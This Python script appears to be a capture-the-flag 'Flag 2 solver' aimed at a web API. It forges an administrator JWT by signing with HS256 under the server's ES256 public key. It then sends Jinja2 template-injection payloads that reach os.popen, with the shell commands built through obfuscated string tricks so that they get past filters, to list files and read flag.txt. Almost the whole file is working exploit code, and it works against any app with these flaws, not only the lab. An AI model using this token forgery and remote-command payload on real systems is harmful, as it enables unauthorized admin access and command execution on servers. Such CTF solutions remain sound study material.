import jwt
import requests
from datetime import datetime, timedelta
from argparse import ArgumentParser

def read_key(path):
    with open(path, 'rb') as f:
        key = f.read()
    return key

def decode_token(token, key):
    return jwt.decode(token, key, algorithms=["ES256"])

def encode_token(token, key):
    return jwt.encode(token, key, algorithm="HS256")

def main():
    parser = ArgumentParser(prog="flag2", description="Flag 2 solver")
    parser.add_argument("public_key", help="The public key file.")
    parser.add_argument("-u", "--url", default="http://localhost:3000/api/v1/riddle", help="URL to the authen API.")
    args = parser.parse_args()

    key = read_key(args.public_key)

    now = datetime.utcnow()
    payload = {
        "exp": now + timedelta(hours=24),
        "iat": now,
        "sub": "adminery@admin.com",
        "role": 0
    }
    fake_token = encode_token(payload, key)

    print("ENCODE ADMIN TOKEN WITH HS256")
    print("-"*40)
    print("Payload:", payload)
    print("Token:", fake_token)
    print()

    print("LIST FILES WITH PAYLOAD")
    print("-"*40)
    command1 = "{}.__lt__.__name__[-{}.copy.__name__.__len__()]+[].sort.__name__[{}.__len__()]"
    print("Command:", eval(command1))
    payload1 = "{{ cycler.__init__.__globals__.os.popen(%s).read() }}" % command1
    print("Payload:", payload1)
    print()

    print("PRINT FILE flag.txt WITH PAYLOAD")
    print("-"*40)
    command2 = "{}.copy.__name__[{}.__len__()]+[].append.__name__[[].__len__()]+[].__lt__.__name__[{}.get.__name__.__len__()]+[].__doc__[{}.fromkeys.__name__.__len__()]+{}.fromkeys.__name__[[].__len__()]+{}.__le__.__name__[-{}.copy.__name__.__len__()]+[].append.__name__[[].__len__()]+{}.get.__name__[[].__len__()]"
    print("Command:", eval(command2))
    payload2 = "{{ cycler.__init__.__globals__.os.popen(%s).read() }}" % command2
    print("Payload:", payload2)
    print()

    print("SEND REQUEST WITH MALICIOUS TOKEN AND PAYLOAD")
    print("-"*40)
    print("URL:", args.url)
    resp = requests.post(args.url, json={"answer": payload1}, headers={"Authorization": f"Bearer {fake_token}"})
    print(f"Response {eval(command1)}:", resp.content.decode())
    resp = requests.post(args.url, json={"answer": payload2}, headers={"Authorization": f"Bearer {fake_token}"})
    print(f"Response {eval(command2)}:", resp.content.decode())

main()
